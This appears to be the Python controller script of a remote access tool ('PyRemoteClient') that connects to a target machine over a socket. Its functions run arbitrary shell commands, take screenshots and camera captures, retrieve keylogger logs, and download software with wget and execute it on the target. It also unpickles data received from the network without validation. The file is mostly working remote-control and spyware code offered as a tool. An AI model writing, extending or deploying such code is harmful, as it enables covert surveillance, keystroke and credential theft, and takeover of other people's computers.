import socket
import sys
import GUI
import os
import pickle

HEADER = 64 
PORT = 5000
SERVER = "127.0.0.1"
ADDR = (SERVER, PORT)
FORMAT = "utf-8"
DISCONNECTED_MESSAGE = "DISCONNECT"

MAINFOLDER = "PyRemoteClient/"

try:
    os.mkdir(MAINFOLDER)
except FileExistsError:
    pass
try:
    os.mkdir(MAINFOLDER + "logs")
except FileExistsError:
    pass


class Client:
    def __init__(self, address):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect(address)

    def send(self, msg: str):
        """Get Header Length so object is more easily decoded on server side, then send both header and msg"""
        msg_length = len(msg)
        msg_length = str(msg_length).encode(FORMAT)
        msg_length += b" " * (HEADER - len(msg_length))
        self.conn.send(msg_length)
        self.conn.send(msg.encode(FORMAT))
        if msg == DISCONNECTED_MESSAGE:
            sys.exit()

    def disconnect(self):
        """Handle Clean Disconnect on server side"""
        self.send(DISCONNECTED_MESSAGE)

    def screenshot(self):
        self.send("screenshot")
        recvheader = int(self.conn.recv(1024))
        screenshot = self.conn.recv(recvheader)
        return screenshot

    def capture(self):
        self.send("capture")
        recvheader = int(self.conn.recv(1024))
        capture = self.conn.recv(recvheader)
        return capture

    def command(self, cmd: str):
        """Connects to server and runs command and returns output"""
        self.send(f"cmd {cmd}")
        header = self.conn.recv(HEADER).decode(FORMAT)
        if header:
            header = int(header)
            output = self.conn.recv(header).decode(FORMAT)
            return output

    def deployKeylogger(self) -> bool:
        """
        Returns a boolean values indicating whether keylogger is enabled or disabled
        :return:
        """
        # Toggling will be done client-side, technically server-side
        pass

    def getKeyloggerOutput(self):
        """
        Returns a list containing the raw output of the keylogger
        :return:
        """
        self.send("getKeyloggerLogs")
        header = int(self.conn.recv(HEADER).decode(FORMAT))
        pickledlogs = self.conn.recv(header)
        pickledlogs = pickle.loads(pickledlogs)
        print(type(pickledlogs))
        for log in pickledlogs:
            with open(f"{MAINFOLDER}logs/{log[:12]}", "w+") as f:
                f.write(log)

    def downloadSoftware(self, url: str) -> str:
        """
        Downloads file onto computer and returns output from other computer
        :param url:
        :return:
        """
        return self.command(f"wget {url}")

    def deploySoftware(self, command: str):
        """
        Executes file that was downloaded
        :param command:
        :return:
        """
        return self.command(command)


client = Client(ADDR)

app = GUI.App(client)
app.mainloop()

client.disconnect()
